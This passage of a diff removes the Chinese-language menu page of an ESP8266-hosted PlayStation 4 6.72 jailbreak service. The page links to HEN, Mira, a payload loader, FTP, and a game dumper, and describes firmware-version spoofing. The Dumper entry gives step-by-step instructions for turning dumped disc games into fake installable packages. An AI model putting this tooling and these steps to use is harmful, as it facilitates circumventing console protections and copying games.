-			}
-
-			.corner-ribbon.bottom-left{
-			  top: auto;
-			  bottom: 25px;
-			  left: -50px;
-			  transform: rotate(45deg);
-			  -webkit-transform: rotate(45deg);
-			}
-
-			.corner-ribbon.bottom-right{
-			  top: auto;
-			  right: -50px;
-			  bottom: 25px;
-			  left: auto;
-			  transform: rotate(-45deg);
-			  -webkit-transform: rotate(-45deg);
-			}
-
-			/* Colors */
-
-			.corner-ribbon.white{background: #f0f0f0; color: #555;}
-			.corner-ribbon.black{background: #333;}
-			.corner-ribbon.grey{background: #999;}
-			.corner-ribbon.blue{background: #4d4dff;}
-			.corner-ribbon.green{background: #2c7;}
-			.corner-ribbon.turquoise{background: #1b9;}
-			.corner-ribbon.purple{background: #95b;}
-			.corner-ribbon.red{background: #e43;}
-			.corner-ribbon.orange{background: #e82;}
-			.corner-ribbon.yellow{background: #ec0;}		
-		
-		</style>
-		
-		<script src="jquery-3.3.1.min.js"></script>			
-		<script src="owl.carousel.min.js"></script>		
-		
-		<script>
-
-			if (!(localStorage.getItem("offlineAppInstalled") === null)) {
-				window.location.replace("ps4_672_offline_index.html");
-			}
-		
-			var bNegativeTheme = !(localStorage.getItem("negativeTheme") === null);		
-			var exploitVer;
-		
-			$(function(){				
-				
-				if (document.cookie == "") { //get current REAL FW version on first run - if cookies are deleted while on spoofed FW it will redirect to FW not supported page ... ¯\_(ツ)_/¯
-					document.cookie = "fw=" + navigator.userAgent.substring(navigator.userAgent.indexOf("PlayStation 4") + 14, navigator.userAgent.indexOf("PlayStation 4") + 18) + ";max-age=31536000";					
-				}
-
-				$("#exploitInfo").append("<br><br>真实系统版本: " + document.cookie.split("=")[1]);
-				$("#exploitInfo").append("<br><br>当前系统版本 (可能是伪装的): " + navigator.userAgent.substring(navigator.userAgent.indexOf("PlayStation 4") + 14, navigator.userAgent.indexOf("PlayStation 4") + 18));
-				
-				var owl = $('.owl-carousel');
-
-				owl.owlCarousel({
-					loop:false,
-					margin:10,
-					autoWidth:false,
-					dots:false,
-					nav:true,
-					navText: ['<div><svg id="svg-nav-672-prev" xmlns="http://www.w3.org/2000/svg" width="445" height="445" viewBox="0 0 444.5 444.5"><path d="M213.1 222.4L351.9 83.7c7.1-7 10.6-15.7 10.6-25.8 0-10.2-3.5-18.8-10.6-25.8l-21.4-21.4C323.4 3.5 314.8 0 304.6 0s-18.8 3.5-25.8 10.6L92.6 196.4c-7 7-10.6 15.7-10.6 25.8s3.5 18.8 10.6 25.8l186.1 185.9c7.1 7 15.7 10.6 25.8 10.6s18.8-3.5 25.8-10.6l21.4-21.4c7.1-7 10.6-15.6 10.6-25.7 0-10.1-3.5-18.7-10.6-26L213.1 222.4z"/></svg></div>', '<div><svg id="svg-nav-672-next" xmlns="http://www.w3.org/2000/svg" width="445" height="445" viewBox="0 0 444.8 444.8"><path d="M352 196.7L165.9 10.8C159 3.6 150.5 0 140.2 0c-10.3 0-18.8 3.6-25.7 10.8L92.8 32.3c-7 7-10.6 15.6-10.6 25.7 0 9.9 3.5 18.6 10.6 26l138.8 138.5L92.8 361.2c-7 7-10.6 15.6-10.6 25.7 0 9.9 3.5 18.6 10.6 26l21.7 21.4c7 7 15.6 10.6 25.7 10.6 10.1 0 18.7-3.5 25.7-10.6l186.1-185.9c7-7.4 10.6-16.1 10.6-26C362.6 212.3 359.1 203.8 352 196.7z"/></svg></div>'],
-					navClass: ['owl-prev-672','owl-next-672'],
-					items:6
-				})				
-
-				owl.on('changed.owl.carousel', function(event) {
-					beep();
-				})				
-				
-				$(document).on('keydown', function(e){
-
-				
-					switch(e.keyCode) {
-					
-						//case 39: //keyboard right
-						case 117: //PS4 R1
-							$('#svg-nav-672-next path').css('fill','#f00');
-							owl.trigger('next.owl');							
-							if (bNegativeTheme) {
-								setTimeout(function(){ $('#svg-nav-672-next path').css('fill','#eee'); }, 120);
-							}else{
-								setTimeout(function(){ $('#svg-nav-672-next path').css('fill','#000'); }, 120);
-							}
-							break;
-						
-						//case 37: // keyboard left
-						case 116: //PS4 L1
-							$('#svg-nav-672-prev path').css('fill','#f00');							
-							owl.trigger('prev.owl');
-							if (bNegativeTheme) {
-								setTimeout(function(){ $('#svg-nav-672-prev path').css('fill','#eee'); }, 120);
-							}else{
-								setTimeout(function(){ $('#svg-nav-672-prev path').css('fill','#000'); }, 120);
-							}
-							break;
-
-						//case 38: // keyboard up
-						case 118: //PS4 L2
-						case 119: //PS4 R2
-							//swith to dark theme
-							bNegativeTheme = !bNegativeTheme;
-							if (!bNegativeTheme) {
-								localStorage.removeItem("negativeTheme");
-							}else{
-								localStorage.setItem("negativeTheme",bNegativeTheme);
-							}
-							setNegativeTheme(bNegativeTheme);
-							break;							
-					} 					
-								
-				});				
-				
-				setNegativeTheme(bNegativeTheme);
-
-				$.ajax({
-					url: 'version.json',
-					dataType : 'json',
-					type:  'get',
-					success:  function (response) {			
-						$("#version").html(response.version);
-					},
-					error: function(){ // will fire when timeout is reached
-						$("#version").html("错误");
-					},
-					timeout: 5000 // sets timeout to 5 seconds
-				});
-				
-				$("#year").html(new Date().getFullYear());
-				
-				if (localStorage.getItem("exploitVer") === null) {
-					$('#exploitSelectorOverlay').css("visibility","visible");
-					$('#exploitSelectorDialog').css("visibility","visible");
-					$('#saveSelectedExploitButton').css("visibility","visible");				
-				}else{
-					exploitVer = localStorage.getItem("exploitVer");
-				}
-				
-				$("#saveSelectedExploitButton").click(function(e) {
-					$('#exploitSelectorOverlay').css("visibility","hidden");
-					$('#exploitSelectorDialog').css("visibility","hidden");
-					$('#saveSelectedExploitButton').css("visibility","hidden");
-
-					exploitVer = $('input[name="exploitVer"]:checked').val();
-					localStorage.setItem("exploitVer",exploitVer);
-				});				
-				
-			});
-
-			function beep() {
-				//$("#beep")[0].pause();
-				//$("#beep")[0].currentTime=0;
-				$("#beep")[0].play();			
-			}			
-			
-			function setNegativeTheme(bNegative) {
-			
-				if (bNegative) {
-					$('body').css("background-color","#111");
-					$('.divExploitOption').css("border-color","#eee");
-					$('.divExploitInfo').css("border-color","#eee");
-					$('h1').css("color","#eee");
-					$('h2').css("color","#eee");
-					$('footer').css("color","#eee");
-					$('#exploitInfo').css("color","#eee");				
-					$('svg path').css("fill","#eee");
-					$('svg polygon').css("fill","#eee");
-					$('svg').hover(
-						function(){$(this).find('path').css('fill', '#f00');}, 
-						function(){$(this).find('path').css('fill', '#eee');}				
-					);
-					$('svg').hover(
-						function(){$(this).find('polygon').css('fill', '#f00');}, 
-						function(){$(this).find('polygon').css('fill', '#eee');}				
-					);					
-					$('button').hover(
-						function(){$(this).find('path').css('fill', '#f00');}, 
-						function(){$(this).find('path').css('fill', '#eee');}					
-					);
-				}else{
-					$('body').css("background-color","#fff");
-					$('.divExploitOption').css("border-color","#000");
-					$('.divExploitInfo').css("border-color","#000");
-					$('h1').css("color","#4d4dff");
-					$('h2').css("color","#000");
-					$('footer').css("color","#000");
-					$('#exploitInfo').css("color","#000");				
-					$('svg path').css("fill","#000");
-					$('svg polygon').css("fill","#000");
-					$('svg').hover(
-						function(){$(this).find('path').css('fill', '#f00');}, 
-						function(){$(this).find('path').css('fill', '#000');}				
-					);
-					$('svg').hover(
-						function(){$(this).find('polygon').css('fill', '#f00');}, 
-						function(){$(this).find('polygon').css('fill', '#000');}				
-					);					
-					$('button').hover(
-						function(){$(this).find('path').css('fill', '#f00');}, 
-						function(){$(this).find('path').css('fill', '#000');}					
-					);				
-				}
-			}			
-				
-			var exploitInfo = {
-				"Mira-Unofficial":"HEN 对应 PS4 FW 6.72 <br><br>Mira (非官方) 由 Al Azif 和 OpenOrbis 团队开发",
-				"SiSTR0":"SiSTR0's HEN 2.1.3 对应 6.72<br><br>功能:<br><br><ul><li>越狱, Sandbox 脱出 & 启用自制程序</li><li>Debug Settings</li><li>支持远程软件包安装, 恢复模式唤醒 & 支持外置 HDD 7.xx 格式</li><li>伪装固件版本到 7.51</li><li>支持调试奖杯</li><li>sys_dynlib_dlsym 补丁</li><li>启用 UART</li><li>永不禁用屏幕截图</li><li>启用远程播放</li></ul>",
-				"FTP":"xvortex FTP 1.3 由 Al Azif 适配 6.72<br><br>启动 FTP 服务器, 端口为 1337.",
-				"Dumper":"xvortex dumper 1.8 由 Al Azif 适配 6.72<br><br>将游戏转储到外置 USB 存储设备. 使用说明:<ol><li>启动主机, 插入游戏光盘 (或运行 psn 游戏), 安装好所有的游戏补丁.</li><li>插入 USB 存储设备, 运行这个 ps4-转储游戏 payload (.bin 或独立功能).</li><li>运行游戏, 确定已进入游戏主界面, 最小化游戏 (按 PS 键).</li><li>等待程序完成. 该过程完成后指示灯会停止闪烁, 主机将会自动关闭 (这是正常的现象, 不是断电).</li><li>启动主机, 取出光盘, 卸载已安装的游戏 (目的是为进一步测试).</li><li>转至 PC 操作: 插入 USB 存储设备, 运行 gengp4.exe, 指向 CUSAxxxxx 路径然后按 Generate .GP4, 您应该会看到 'Done.', 然后按 Save .GP4.</li><li>在 orbis-pub-gen 路径中打开 .gp4 并构建 .pkg 文件 (您可以通过 PKG_Fake_Generator 获得 orbis-pub-gen 工具).</li><li>运行 PS4HEN payload, 安装并测试您的 .pkg 文件.</li></ol>",			
-				"BinLoader":"BIN 加载器 <br><br>此漏洞利用包括一个侦听端口 9020 上的 Payload 并在接收到它们时执行它们的加载程序.<br><br>使用 智能手机 / PC 工具软件发送 .bin 有效负载. 如果使用SD卡存储 .bin 有效负载, 则需要将它们放置在 /ps4/bin 目录中.",
-				"DB-SG Backup":"Stooged DB-SG Backup v3 由 Al Azif 适配 6.72<br><br>将 addcont.db， app.db 和 gameaves 备份到外部 USB 存储设备.<br>该 payload 将保存的数据转储到名为 GameSaves 的文件夹中, 并将 addcont.db 和 app.db 文件转储到 USB 上的名为 DB_Dackup 的文件夹中.<br>执行中请不要关闭浏览器, 直到提示完成为止.",
-				"DB Restore":"Stooged DB Restore v2 由 Al Azif 适配 6.72<br><br>从 USB 恢复使用 DBSG 备份 进行的数据库备份.",
-				"AppToUSB":"Stooged AppToUSB v5 由 Al Azif 适配 6.72<br><br>搜索整个 /user/app 文件夹内所有已安装的 fpkg 游戏并从系统驱动器复制到 USB 存储设备和创建快捷方式链接. 该功能需要使用 USB0 端口.<br>如果您要安装更多游戏, 只需再次运行该功能, 它会将所有新安装游戏复制到 USB.<br><br>请参阅 AppToUsb.ini 中包含的说明以获取更多信息.<br><br>重要提示: 您需要将 .ini 文件复制到 usb0:\PS4\AppToUsb.ini",
-				"PS4 Trainer":"使用来自 ps4trainer.com 的游戏金手指 <br> 访问其网站获取帮助.",
-				"Disable Updates":"LightningMods_ Disable Updates payload 由 Al Azif 适配 6.72",
-				"Enable Updates":"LightningMods_ Enable Updates payload 由 Al Azif 适配 6.72",
-				"Offline":"离线缓存安装功能<br><br>安装所有主机文件以供离线浏览.<br><br>不会安装需要有效网络连接时的功能选件.",		
-				"ToDEX":"@notzecoxao 开发的 ToDEX 改编自 @Zer0xFF's 的 ReactPSPlus. <br><br>这个转换不是永久性的, 只需重新启动主机即可恢复零售机模式."
-			};
-
-			function showInfo(key) {
-				$("#exploitInfo").html(exploitInfo[key]);
-			}
-
-			function clearInfo() {
-				$("#exploitInfo").html("请选择任意选项以获取详细信息.");
-			}
-		</script>		
-		
-  	</head>
-	
-  	<body>
-  		<header>			
-  			<h1>ESP8266 破解服务</h1>
-			<h2>Playstation 4 - FW 6.72</h2>
-  		</header>
-  		<main>
-			<div id="version" class="corner-ribbon top-right sticky blue"></div>
-			<div class="owl-carousel" id="exploits_672">				
-				<div class="divExploitOption"><div class="divMenuHeader">Mira (非官方)</div><div class="divMenuBody"><a href="672_mira_index.html?xpl=x" onclick="this.href=this.href.split('?')[0]+'?xpl='+exploitVer"><svg onmouseover="showInfo('Mira-Unofficial');" onmouseout="clearInfo();" xmlns="http://www.w3.org/2000/svg" width="500" height="500" viewBox="0 0 500 500"><path d="M400 0h-66.7c-55.1 0-100 44.9-100 100v100H25c-13.7 0-25 11.3-25 25v250c0 13.8 11.3 25 25 25h283.3c13.8 0 25-11.2 25-25V225c0-13.7-11.2-25-25-25H300V100c0-18.4 15-33.3 33.3-33.3H400c18.4 0 33.3 15 33.3 33.3v100H500V100C500 44.9 505.1 0 400 0zM200 433.3h-66.7l14.5-72.5c-8.8-6-14.5-16.1-14.5-27.5 0-18.4 14.9-33.3 33.3-33.3S200 314.9 200 333.3c0 11.4-5.7 21.5-14.5 27.5L200 433.3z"/></svg></a></div></div>
-				<div class="divExploitOption"><div class="divMenuHeader">HEN 2.1.3</div><div class="divMenuBody"><a href="672_sistro_hen_index.html?xpl=x" onclick="this.href=this.href.split('?')[0]+'?xpl='+exploitVer"><svg onmouseover="showInfo('SiSTR0');" onmouseout="clearInfo();" xmlns="http://www.w3.org/2000/svg" width="500" height="500" viewBox="0 0 500 500"><path d="M400 0h-66.7c-55.1 0-100 44.9-100 100v100H25c-13.7 0-25 11.3-25 25v250c0 13.8 11.3 25 25 25h283.3c13.8 0 25-11.2 25-25V225c0-13.7-11.2-25-25-25H300V100c0-18.4 15-33.3 33.3-33.3H400c18.4 0 33.3 15 33.3 33.3v100H500V100C500 44.9 505.1 0 400 0zM200 433.3h-66.7l14.5-72.5c-8.8-6-14.5-16.1-14.5-27.5 0-18.4 14.9-33.3 33.3-33.3S200 314.9 200 333.3c0 11.4-5.7 21.5-14.5 27.5L200 433.3z"/></svg></a></div></div>				
-				<div class="divExploitOption"><div class="divMenuHeader">BIN 加载器</div><div class="divMenuBody"><a href="672_binloader_index.html?xpl=x" onclick="this.href=this.href.split('?')[0]+'?xpl='+exploitVer"><svg onmouseover="showInfo('BinLoader');" onmouseout="clearInfo();" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 318.2 318.2"><path d="M189.3 94.3c.6-.5 1.6-1.4 3.1-2.9l-.1 4.4-.1 4v24.3h8.9v-42h-7.3l-13.5 10.8 4.3 5.3 4.7-3.9zm-67.2 0c.6-.5 1.6-1.4 3.1-2.9l-.1 4.4-.1 4v24.3h8.9v-42h-7.3L113 92.8l4.3 5.3 4.8-3.8zm67.2 57.6c.6-.5 1.6-1.4 3.1-2.9l-.1 4.4-.1 4v24.3h8.9v-42h-7.3l-13.5 10.8 4.3 5.3 4.7-3.9zm-29.4-27.2c5 0 8.7-1.8 11.1-5.3 2.4-3.5 3.6-9 3.6-16.3 0-7.1-1.2-12.5-3.7-16.1-2.5-3.7-6.1-5.5-11-5.5-5 0-8.7 1.8-11.1 5.3-2.4 3.5-3.6 9-3.6 16.4 0 7.1 1.2 12.5 3.7 16.1 2.5 3.5 6.2 5.4 11 5.4zM155.4 92c.9-2.2 2.4-3.4 4.5-3.4 2 0 3.5 1.1 4.5 3.4.9 2.3 1.4 6 1.4 11.1s-.5 8.8-1.4 11c-.9 2.3-2.4 3.4-4.5 3.4s-3.6-1.1-4.5-3.3c-.9-2.2-1.3-5.9-1.3-11.1 0-5.2.4-8.9 1.3-11.1z"/><path d="M283.1 52.7L232.6 2.2C231.2.8 229.3 0 227.3 0h-187c-4.1 0-7.5 3.4-7.5 7.5v303.2c0 4.1 3.4 7.5 7.5 7.5h237.5c4.1 0 7.5-3.4 7.5-7.5V58c0-2-.7-3.9-2.2-5.3zm-48.3-27.1l24.9 24.9h-24.9V25.6zM47.8 15h172v10.3h-172V15zm222.5 288.2H47.8V40.3h172v17.8c0 4.1 3.4 7.5 7.5 7.5h43v237.6z"/><path d="M126.3 139c-5 0-8.7 1.8-11.1 5.3s-3.6 9-3.6 16.4c0 7.1 1.2 12.5 3.7 16.1 2.5 3.6 6.1 5.5 11 5.5 5 0 8.7-1.8 11.1-5.3 2.4-3.5 3.6-9 3.6-16.3 0-7.1-1.2-12.5-3.7-16.1-2.5-3.8-6.1-5.6-11-5.6zm4.5 32.7c-.9 2.3-2.4 3.4-4.5 3.4s-3.6-1.1-4.5-3.3c-.9-2.2-1.3-5.9-1.3-11.1s.4-8.9 1.4-11.1c.9-2.2 2.4-3.4 4.5-3.4 2 0 3.5 1.1 4.5 3.4.9 2.3 1.4 6 1.4 11.1-.1 5.1-.6 8.7-1.5 11zm-1.2 84.5v-.3c2.3-.5 4.1-1.8 5.4-3.7 1.4-1.9 2.1-4.2 2.1-6.9 0-4.1-1.6-7.1-4.7-9-3.2-1.9-8-2.9-14.5-2.9h-16.7v48h18.7c5.6 0 10.1-1.3 13.4-3.8 3.3-2.5 4.9-5.9 4.9-10.3 0-2.9-.7-5.3-2-7.2-1.4-1.8-3.6-3.1-6.6-3.9zm-11.8-13c4.1 0 6.1 1.3 6.1 4 0 1.5-.5 2.6-1.5 3.4-1 .8-2.5 1.1-4.3 1.1h-3.9v-8.6h3.6zm.9 28.2h-4.6v-10.1h4.3c2.1 0 3.6.4 4.7 1.3s1.6 2.1 1.6 3.7c.1 3.4-2 5.1-6 5.1zm27.9-121l4.3 5.3 4.8-3.9c.6-.5 1.6-1.4 3.1-2.9l-.1 4.4-.1 4v24.3h8.9v-42h-7.3l-13.6 10.8zM204 255.1c0 2.9.2 6.8.5 11.7h-.2l-17.5-33.3h-16.9v48h11.5v-21.6c0-2.8-.2-6.9-.6-12.2h.3l17.5 33.8h17v-48H204v21.6zm-57.5-21.7h13v48h-13z"/></svg></a></div></div>				
-				<div class="divExploitOption"><div class="divMenuHeader">Dumper</div><div class="divMenuBody"><a href="672_dumper_index.html?xpl=x" onclick="this.href=this.href.split('?')[0]+'?xpl='+exploitVer"><svg onmouseover="showInfo('Dumper');" onmouseout="clearInfo();" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 439.2 439.2"><path d="M219.6 263.3c11.2 0 22.4-4.3 30.9-12.8 8.3-8.3 12.8-19.3 12.8-30.9 0-11.7-4.6-22.7-12.8-30.9 -17.1-17.1-44.8-17.1-61.9 0s-17.1 44.8 0 61.9C197.2 259.1 208.4 263.3 219.6 263.3zM199.3 199.3c5.6-5.6 13-8.4 20.3-8.4 7.4 0 14.7 2.8 20.3 8.4 5.4 5.4 8.4 12.7 8.4 20.3 0 7.7-3 14.9-8.4 20.3 0 0 0 0 0 0 -11.2 11.2-29.5 11.2-40.7 0C188 228.7 188 210.5 199.3 199.3z"/><path d="M219.6 292.1c19.4 0 37.6-7.5 51.3-21.3 28.3-28.3 28.3-74.3 0-102.6s-74.3-28.3-102.6 0c-13.7 13.7-21.3 31.9-21.3 51.3s7.5 37.6 21.3 51.3C182 284.6 200.2 292.1 219.6 292.1zM178.9 178.9c11.2-11.2 26-16.8 40.7-16.8 14.7 0 29.5 5.6 40.7 16.8 22.4 22.4 22.4 59 0 81.4 -10.9 10.9-25.3 16.9-40.7 16.9s-29.8-6-40.7-16.9C156.5 237.9 156.5 201.3 178.9 178.9z"/><path d="M374.9 64.3C333.4 22.8 278.2 0 219.6 0c-58.7 0-113.8 22.8-155.3 64.3S0 160.9 0 219.6s22.8 113.8 64.3 155.3 96.6 64.3 155.3 64.3c58.7 0 113.8-22.8 155.3-64.3 41.5-41.5 64.3-96.6 64.3-155.3S416.3 105.8 374.9 64.3zM74.9 74.9C113.6 36.3 164.9 15 219.6 15c52.1 0 101.3 19.4 139.3 54.7l-82.8 82.8c-2.9 2.9-2.9 7.7 0 10.6 1.5 1.5 3.4 2.2 5.3 2.2s3.8-0.7 5.3-2.2l82.8-82.8c17.5 18.8 30.8 40.1 39.9 62.8l-12.7 12.8c-2.9 2.9-2.9 7.7 0 10.6 1.5 1.5 3.4 2.2 5.3 2.2s3.8-0.7 5.3-2.2l7.7-7.7c1.7 5.3 3.1 10.7 4.3 16.2L174.8 419.3c-5.5-1.2-10.9-2.7-16.2-4.3l217-217c2.9-2.9 2.9-7.7 0-10.6 -2.9-2.9-7.7-2.9-10.6 0L143 409.4c-22.9-9.2-44.2-22.7-62.7-40l81.9-81.9c2.9-2.9 2.9-7.7 0-10.6 -2.9-2.9-7.7-2.9-10.6 0l-81.9 81.9C-4.8 278.7-3.1 152.9 74.9 74.9zM364.3 364.3c-38.6 38.6-90 59.9-144.7 59.9 -9 0-17.9-0.6-26.7-1.7L422.4 193C430.3 253.9 410.9 317.6 364.3 364.3z"/><path d="M379 180c0.2 0.5 0.4 0.9 0.7 1.3 0.3 0.4 0.6 0.8 0.9 1.1 0.3 0.4 0.7 0.7 1.1 0.9 0.4 0.3 0.8 0.5 1.3 0.7 0.5 0.2 0.9 0.3 1.4 0.4 0.5 0.1 1 0.1 1.5 0.1s1 0 1.5-0.1c0.5-0.1 1-0.2 1.4-0.4s0.9-0.4 1.3-0.7c0.4-0.3 0.8-0.6 1.1-0.9 0.4-0.3 0.7-0.7 0.9-1.1 0.3-0.4 0.5-0.8 0.7-1.3 0.2-0.4 0.3-0.9 0.4-1.4 0.1-0.5 0.2-1 0.2-1.5 0-0.5 0-1-0.1-1.5 -0.1-0.5-0.2-0.9-0.4-1.4 -0.2-0.4-0.4-0.9-0.7-1.3 -0.3-0.4-0.6-0.8-0.9-1.1 -0.3-0.3-0.7-0.7-1.1-0.9 -0.4-0.3-0.8-0.5-1.3-0.7 -0.4-0.2-0.9-0.3-1.4-0.4 -1-0.2-2-0.2-2.9 0 -0.5 0.1-0.9 0.2-1.4 0.4 -0.4 0.2-0.9 0.4-1.3 0.7s-0.8 0.6-1.1 0.9c-0.4 0.3-0.7 0.7-0.9 1.1 -0.3 0.4-0.5 0.8-0.7 1.3 -0.2 0.5-0.3 0.9-0.4 1.4 -0.1 0.5-0.1 1-0.1 1.5 0 0.5 0.1 1 0.2 1.5C378.6 179.1 378.8 179.6 379 180z"/></svg></a></div></div> 
-				<div class="divExploitOption"><div class="divMenuHeader">转换 DEX</div><div class="divMenuBody"><a href="672_todex_index.html?xpl=x" onclick="this.href=this.href.split('?')[0]+'?xpl='+exploitVer"><svg onmouseover="showInfo('ToDEX');" onmouseout="clearInfo();" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><polygon points="512 197.82 325.96 185.58 255.9 9.569 185.84 185.58 0 197.82 142.53 318.84 95.762 502.43 255.9 401.21 416.04 502.43 369.26 318.84"/></svg></a></div></div>
-				<div class="divExploitOption"><div class="divMenuHeader">FTP</div><div class="divMenuBody"><a href="672_ftp_index.html?xpl=x" onclick="this.href=this.href.split('?')[0]+'?xpl='+exploitVer"><svg onmouseover="showInfo('FTP');" onmouseout="clearInfo();" xmlns="http://www.w3.org/2000/svg" width="98" height="98" viewBox="0 0 98.4 98.4"><path d="M61.8 54.8c-0.8 0-1.3 0.1-1.6 0.1v5.1c0.3 0.1 0.7 0.1 1.3 0.1 2.1 0 3.3-1 3.3-2.8C64.9 55.8 63.8 54.8 61.8 54.8z"/><path d="M53.2 31.7c-2.2-2.2-5.7-2.2-7.9 0L20.4 56.6c-2.2 2.2-2.2 5.7 0 7.9l24.9 24.9c2.2 2.2 5.7 2.2 7.9 0l24.9-24.9c1.1-1 1.6-2.5 1.6-4s-0.6-2.9-1.6-4L53.2 31.7zM40.2 55.2h-6.6v3.9h6.2v3.2h-6.2v6.9h-3.9V52h10.5V55.2zM55 55.2h-4.7v14H46.4V55.2h-4.6v-3.3h13.2V55.2zM67.2 61.3c-1.3 1.2-3.3 1.8-5.6 1.8 -0.5 0-1 0-1.3-0.1v6.2h-3.9V52.2c1.2-0.2 2.9-0.4 5.3-0.4 2.4 0 4.1 0.5 5.3 1.4 1.1 0.8 1.8 2.3 1.8 4C68.7 58.9 68.2 60.3 67.2 61.3z"/><path d="M78.4 22.4c-0.5 0-1-0.3-1.4-0.8 -4-5.5-10.5-9-17.4-9 -0.5 0-1 0-1.5 0.1 -0.5 0-0.9-0.1-1.3-0.4 -4.2-3.2-9.3-5-14.7-5 -9.6 0-18.1 5.6-21.9 14.1 -0.3 0.6-0.8 1-1.5 1.1C8.2 23.9 0 32.9 0 43.9c0 9.7 6.5 17.9 15.3 20.6 -0.5-1.2-0.8-2.6-0.8-3.9 0-1.8 0.5-3.5 1.3-4.9 -4.3-2.1-7.4-6.6-7.4-11.7 0-7.2 5.8-13 13-13 0.4 0 0.7 0 1.1 0.1 2.1 0.2 3.9-1.2 4.4-3.2 1.8-7 8-11.9 15.2-11.9 4.1 0 8 1.6 10.9 4.5 1 1 2.4 1.4 3.8 1.1 0.9-0.2 1.8-0.3 2.7-0.3 5 0 9.5 2.8 11.7 7.4 0.8 1.6 2.5 2.6 4.2 2.4 0.4 0 0.9-0.1 1.3-0.1 7.2 0 13 5.8 13 13 0 5.1-3 9.6-7.4 11.7 0.9 1.5 1.3 3.2 1.3 4.9 0 1.4-0.3 2.7-0.8 3.9 8.8-2.7 15.3-10.9 15.3-20.6C98.4 32.5 89.6 23.2 78.4 22.4z"/></svg></a></div></div> 
-				<div class="divExploitOption"><div class="divMenuHeader">备份数据</div><div class="divMenuBody"><a href="672_dbsgbackup_index.html?xpl=x" onclick="this.href=this.href.split('?')[0]+'?xpl='+exploitVer"><svg onmouseover="showInfo('DB-SG Backup');" onmouseout="clearInfo();" xmlns="http://www.w3.org/2000/svg" width="512" height="512" viewBox="0 0 512 512"><path d="m437.6 251c-21.1-23.4-49.6-38.3-80.6-42.2-1.1-2.1-2.7-5.1-3.2-5.9l-1.2-2.2c4.8-7.3 7.2-15 7.2-22.7v-45c0-6.7-1.8-13.3-5.4-19.8l-0.4-0.7c1.4-3.5 2.1-6.8 2.1-10 0-18.3-17.5-33.6-50.7-44.5-28.2-9.2-66.5-14.5-105-14.5-38.5 0-76.8 5.3-105 14.5-33.1 10.8-50.7 26.2-50.7 44.5 0 3.2 0.7 6.5 2.1 10l-0.4 0.7c-3.6 6.6-5.4 13.2-5.4 19.9v45c0 7.8 2.4 15.4 7.2 22.7l-1.3 2.2c-4 6.9-6 13.9-6 20.8v45.1c0 7.6 2.3 15 6.9 22.1l-0.9 1.6c-4 6.9-6 13.9-6 20.8v45.1c0 20.6 16.7 39.6 47.1 53.4 29.6 13.5 69.5 21 112.4 21 15.7 0 31.6-1.1 47.2-3.3 24.8 25.3 57.8 39.2 93.1 39.2 71.9 0 130.4-58.5 130.4-130.4 0-32.2-11.9-63.2-33.5-87.2zM101.7 79.5c26-8.6 61-13.4 98.6-13.4 37.6 0 72.6 4.7 98.6 13.4 23.7 7.9 34.3 17.2 34.3 23 0 5.8-10.6 15.1-34.3 23-26 8.6-61 13.4-98.6 13.4-37.6 0-72.6-4.7-98.6-13.4C78 117.6 67.4 108.2 67.4 102.4 67.4 96.7 78 87.3 101.7 79.5Zm-38.1 67.1c25.9 17.9 78.3 29.2 136.7 29.2 58.4 0 110.8-11.3 136.7-29.2v31.5c0 11.6-13.9 24.4-37.1 34.3-26.5 11.2-61.8 17.4-99.6 17.4-37.7 0-73.1-6.2-99.5-17.4-23.3-9.8-37.1-22.7-37.1-34.3zm136.7 263.4c-37.7 0-73.1-6.2-99.5-17.4-23.3-9.8-37.1-22.6-37.1-34.2v-35.9c28 21.8 79.4 35.1 136.7 35.1 3.9 0 7.6-0.2 11.3-0.4 2.7 18.2 9.3 35.8 19.2 51.4-10.1 1-20.4 1.5-30.5 1.5zm11.2-90c-3.6 0.2-7.4 0.4-11.2 0.4-37.7 0-73.1-6.2-99.5-17.4C77.5 293.1 63.7 280.3 63.7 268.8v-36c27.9 21.8 79.4 35.1 136.7 35.1 10 0 20.4-0.5 31.6-1.6-10.7 16.1-17.7 34.5-20.4 53.7zm129.1 116.8c-54.3 0-98.6-44.2-98.6-98.6 0-54.3 44.2-98.6 98.6-98.6 54.3 0 98.6 44.2 98.6 98.6 0 54.3-44.2 98.6-98.6 98.6zm4.4-52.9v-20.3h-58.7c-2.4 0-4.4-1.9-4.4-4.4v-42c0-2.4 2-4.4 4.4-4.4h58.7V292.5c0-1.8 1.1-3.4 2.7-4 1.6-0.7 3.5-0.3 4.7 0.9l45.6 45.6c0.8 0.8 1.3 1.9 1.3 3.1 0 1.2-0.5 2.3-1.3 3.1l-45.6 45.6c-1.2 1.2-3.1 1.6-4.7 0.9-1.6-0.7-2.7-2.3-2.7-4z"/></svg></a></div></div>
-				<div class="divExploitOption"><div class="divMenuHeader">恢复备份</div><div class="divMenuBody"><a href="672_dbrestore_index.html?xpl=x" onclick="this.href=this.href.split('?')[0]+'?xpl='+exploitVer"><svg onmouseover="showInfo('DB Restore');" onmouseout="clearInfo();" xmlns="http://www.w3.org/2000/svg" width="512" height="512" viewBox="0 0 512 512"><path d="M336.3 383.8v-20.3h58.7c2.4 0 4.4-1.9 4.4-4.4v-42c0-2.4-2-4.4-4.4-4.4h-58.7V292.5c0-1.8-1.1-3.4-2.7-4 -1.6-0.7-3.5-0.3-4.7 0.9l-45.6 45.6c-0.8 0.8-1.3 1.9-1.3 3.1 0 1.2 0.5 2.3 1.3 3.1l45.6 45.6c1.2 1.2 3.1 1.6 4.7 0.9C335.3 387.2 336.3 385.6 336.3 383.8z"/><path d="M437.6 251c-21.1-23.4-49.6-38.3-80.6-42.2 -1.1-2.1-2.7-5.1-3.2-5.9l-1.2-2.2c4.8-7.3 7.2-15 7.2-22.7v-45c0-6.7-1.8-13.3-5.4-19.8l-0.4-0.7c1.4-3.5 2.1-6.8 2.1-10 0-18.3-17.5-33.6-50.7-44.5 -28.2-9.2-66.5-14.5-105-14.5 -38.5 0-76.8 5.3-105 14.5 -33.1 10.8-50.7 26.2-50.7 44.5 0 3.2 0.7 6.5 2.1 10l-0.4 0.7c-3.6 6.6-5.4 13.2-5.4 19.9v45c0 7.8 2.4 15.4 7.2 22.7l-1.3 2.2c-4 6.9-6 13.9-6 20.8v45.1c0 7.6 2.3 15 6.9 22.1l-0.9 1.6c-4 6.9-6 13.9-6 20.8v45.1c0 20.6 16.7 39.6 47.1 53.4 29.6 13.5 69.5 21 112.4 21 15.7 0 31.6-1.1 47.2-3.3 24.8 25.3 57.8 39.2 93.1 39.2 